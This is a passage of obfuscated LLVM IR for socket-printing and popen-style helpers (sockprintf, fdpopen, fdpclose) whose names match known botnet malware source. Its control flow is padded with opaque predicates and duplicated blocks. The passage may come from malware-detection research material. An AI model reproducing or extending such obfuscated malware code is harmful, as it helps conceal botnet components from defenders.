  %24 = load i32, i32* %12, align 4
  %25 = trunc i32 %24 to i8
  %26 = load i8**, i8*** %11, align 8
  %27 = load i8*, i8** %26, align 8
  store i8 %25, i8* %27, align 1
  %28 = load i8**, i8*** %11, align 8
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %28, align 8
  br label %50

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.13
  %33 = load i32, i32* @y.14
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = bitcast i32* %12 to i8*
  %41 = call i64 @write(i32 1, i8* %40, i64 1)
  %42 = load i32, i32* @x.13
  %43 = load i32, i32* @y.14
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %23
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %55 = bitcast i32* %12 to i8*
  %56 = call i64 @write(i32 1, i8* %55, i64 1)
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %35

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i8*, i8** %13, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp ne i32 %33, 119
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %30, %originalBBpart2
  %36 = load i8*, i8** %13, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %30
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:47:                                     ; preds = %42
  %48 = load i32*, i32** @fdopen_pids, align 8
  %49 = icmp eq i32* %48, null
  br i1 %49, label %50, label %102

; <label>:50:                                     ; preds = %47
  %51 = call i32 @getdtablesize() #2
  store i32 %51, i32* %16, align 4
  %52 = icmp sle i32 %51, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %50
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* @x.19
  %56 = load i32, i32* @y.20
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %16, align 4
  %64 = sext i32 %63 to i64
  %65 = mul i64 %64, 4
  %66 = trunc i64 %65 to i32
  %67 = zext i32 %66 to i64
  %68 = call noalias i8* @malloc(i64 %67) #2
  %69 = bitcast i8* %68 to i32*
  store i32* %69, i32** @fdopen_pids, align 8
  %70 = icmp eq i32* %69, null
  %71 = load i32, i32* @x.19
  %72 = load i32, i32* @y.20
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %70, label %79, label %96

; <label>:79:                                     ; preds = %originalBBpart24
  %80 = load i32, i32* @x.19
  %81 = load i32, i32* @y.20
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  store i32 -1, i32* %11, align 4
  %88 = load i32, i32* @x.19
  %89 = load i32, i32* @y.20
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %253

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i32*, i32** @fdopen_pids, align 8
  %98 = bitcast i32* %97 to i8*
  %99 = load i32, i32* %16, align 4
  %100 = sext i32 %99 to i64
  %101 = mul i64 %100, 4
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 %101, i32 1, i1 false)
  br label %102

; <label>:102:                                    ; preds = %96, %47
  %103 = call i32 @vfork() #11
  store i32 %103, i32* %17, align 4
  switch i32 %103, label %197 [
    i32 -1, label %104
    i32 0, label %111
  ]

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %11, align 4
  br label %253

; <label>:111:                                    ; preds = %102
  %112 = load i8*, i8** %13, align 8
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 114
  br i1 %115, label %116, label %147

; <label>:116:                                    ; preds = %111
  %117 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %118 = load i32, i32* %117, align 4
  %119 = icmp ne i32 %118, 1
  br i1 %119, label %120, label %127

; <label>:120:                                    ; preds = %116
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %122 = load i32, i32* %121, align 4
  %123 = call i32 @dup2(i32 %122, i32 1) #2
  %124 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %125 = load i32, i32* %124, align 4
  %126 = call i32 @close(i32 %125)
  br label %127

; <label>:127:                                    ; preds = %120, %116
  %128 = load i32, i32* @x.19
  %129 = load i32, i32* @y.20
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  %136 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @close(i32 %137)
  %139 = load i32, i32* @x.19
  %140 = load i32, i32* @y.20
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %194

; <label>:147:                                    ; preds = %111
  %148 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %149 = load i32, i32* %148, align 4
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %151, label %174

; <label>:151:                                    ; preds = %147
  %152 = load i32, i32* @x.19
  %153 = load i32, i32* @y.20
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %151
  %160 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @dup2(i32 %161, i32 0) #2
  %163 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %164 = load i32, i32* %163, align 4
  %165 = call i32 @close(i32 %164)
  %166 = load i32, i32* @x.19
  %167 = load i32, i32* @y.20
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %174

; <label>:174:                                    ; preds = %originalBBpart216, %147
  %175 = load i32, i32* @x.19
  %176 = load i32, i32* @y.20
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @close(i32 %184)
  %186 = load i32, i32* @x.19
  %187 = load i32, i32* @y.20
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %194

; <label>:194:                                    ; preds = %originalBBpart220, %originalBBpart212
  %195 = load i8*, i8** %12, align 8
  %196 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* %195, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:197:                                    ; preds = %102
  %198 = load i32, i32* @x.19
  %199 = load i32, i32* @y.20
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %197
  %206 = load i8*, i8** %13, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 114
  %210 = load i32, i32* @x.19
  %211 = load i32, i32* @y.20
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %209, label %218, label %224

; <label>:218:                                    ; preds = %originalBBpart224
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %14, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %246

; <label>:224:                                    ; preds = %originalBBpart224
  %225 = load i32, i32* @x.19
  %226 = load i32, i32* @y.20
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %224
  %233 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %234 = load i32, i32* %233, align 4
  store i32 %234, i32* %14, align 4
  %235 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %236 = load i32, i32* %235, align 4
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* @x.19
  %239 = load i32, i32* @y.20
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %246

; <label>:246:                                    ; preds = %originalBBpart228, %218
  %247 = load i32, i32* %17, align 4
  %248 = load i32*, i32** @fdopen_pids, align 8
  %249 = load i32, i32* %14, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  store i32 %247, i32* %251, align 4
  %252 = load i32, i32* %14, align 4
  store i32 %252, i32* %11, align 4
  br label %253

; <label>:253:                                    ; preds = %246, %104, %originalBBpart28, %53, %46, %41
  %254 = load i32, i32* %11, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %2
  %255 = alloca i32, align 4
  %256 = alloca i8*, align 8
  %257 = alloca i8*, align 8
  %258 = alloca i32, align 4
  %259 = alloca [2 x i32], align 4
  %260 = alloca i32, align 4
  %261 = alloca i32, align 4
  store i8* %0, i8** %256, align 8
  store i8* %1, i8** %257, align 8
  %262 = load i8*, i8** %257, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %266 = load i32, i32* %16, align 4
  %267 = sext i32 %266 to i64
  %_ = sub i64 0, %267
  %gen = add i64 %_, 4
  %_2 = shl i64 %267, 4
  %268 = mul i64 %267, 4
  %269 = trunc i64 %268 to i32
  %270 = zext i32 %269 to i64
  %271 = call noalias i8* @malloc(i64 %270) #2
  %272 = bitcast i8* %271 to i32*
  store i32* %272, i32** @fdopen_pids, align 8
  %273 = icmp eq i32* %272, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  store i32 -1, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  %274 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @close(i32 %275)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %151
  %277 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %278 = load i32, i32* %277, align 4
  %279 = call i32 @dup2(i32 %278, i32 0) #2
  %280 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %281 = load i32, i32* %280, align 4
  %282 = call i32 @close(i32 %281)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  %283 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %284 = load i32, i32* %283, align 4
  %285 = call i32 @close(i32 %284)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %197
  %286 = load i8*, i8** %13, align 8
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 114
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %224
  %290 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %291 = load i32, i32* %290, align 4
  store i32 %291, i32* %14, align 4
  %292 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %293 = load i32, i32* %292, align 4
  %294 = call i32 @close(i32 %293)
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = load i32, i32* @x.21
  %3 = load i32, i32* @y.22
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.__sigset_t, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %11, align 4
  %18 = load i32*, i32** @fdopen_pids, align 8
  %19 = icmp eq i32* %18, null
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %19, label %51, label %28

; <label>:28:                                     ; preds = %originalBBpart2
  %29 = load i32, i32* @x.21
  %30 = load i32, i32* @y.22
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = load i32*, i32** @fdopen_pids, align 8
  %38 = load i32, i32* %11, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 0
  %43 = load i32, i32* @x.21
  %44 = load i32, i32* @y.22
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %51, label %52

; <label>:51:                                     ; preds = %originalBBpart24, %originalBBpart2
  store i32 -1, i32* %10, align 4
  br label %126

; <label>:52:                                     ; preds = %originalBBpart24
  %53 = load i32, i32* %11, align 4
  %54 = call i32 @close(i32 %53)
  %55 = call i32 @sigemptyset(%struct.__sigset_t* %14) #2
  %56 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 2) #2
  %57 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 3) #2
  %58 = call i32 @sigaddset(%struct.__sigset_t* %14, i32 1) #2
  %59 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %14, %struct.__sigset_t* %13) #2
  br label %60

; <label>:60:                                     ; preds = %74, %52
  %61 = load i32*, i32** @fdopen_pids, align 8
  %62 = load i32, i32* %11, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %61, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = call i32 @waitpid(i32 %65, i32* %15, i32 0)
  store i32 %66, i32* %16, align 4
  br label %67

; <label>:67:                                     ; preds = %60
  %68 = load i32, i32* %16, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %67
  %71 = call i32* @__errno_location() #13
  %72 = load i32, i32* %71, align 4
  %73 = icmp eq i32 %72, 4
  br label %74

; <label>:74:                                     ; preds = %70, %67
  %75 = phi i1 [ false, %67 ], [ %73, %70 ]
  br i1 %75, label %60, label %76

; <label>:76:                                     ; preds = %74
  %77 = load i32, i32* @x.21
  %78 = load i32, i32* @y.22
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %13, %struct.__sigset_t* null) #2
  %86 = load i32*, i32** @fdopen_pids, align 8
  %87 = load i32, i32* %12, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  store i32 0, i32* %89, align 4
  %90 = load i32, i32* %16, align 4
  %91 = icmp eq i32 %90, -1
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %101

; <label>:100:                                    ; preds = %originalBBpart28
  br label %108

; <label>:101:                                    ; preds = %originalBBpart28
  %102 = bitcast %struct.in_addr* %17 to i32*
  %103 = load i32, i32* %15, align 4
  store i32 %103, i32* %102, align 4
  %104 = bitcast %struct.in_addr* %17 to i32*
  %105 = load i32, i32* %104, align 4
  %106 = and i32 %105, 65280
  %107 = ashr i32 %106, 8
  br label %108

; <label>:108:                                    ; preds = %101, %100
  %109 = phi i32 [ -1, %100 ], [ %107, %101 ]
  %110 = load i32, i32* @x.21
  %111 = load i32, i32* @y.22
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  store i32 %109, i32* %10, align 4
  %118 = load i32, i32* @x.21
  %119 = load i32, i32* @y.22
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:126:                                    ; preds = %originalBBpart212, %51
  %127 = load i32, i32* %10, align 4
  ret i32 %127

originalBBalteredBB:                              ; preds = %originalBB, %1
  %128 = alloca i32, align 4
  %129 = alloca i32, align 4
  %130 = alloca i32, align 4
  %131 = alloca %struct.__sigset_t, align 8
  %132 = alloca %struct.__sigset_t, align 8
  %133 = alloca i32, align 4
  %134 = alloca i32, align 4
  %135 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %129, align 4
  %136 = load i32*, i32** @fdopen_pids, align 8
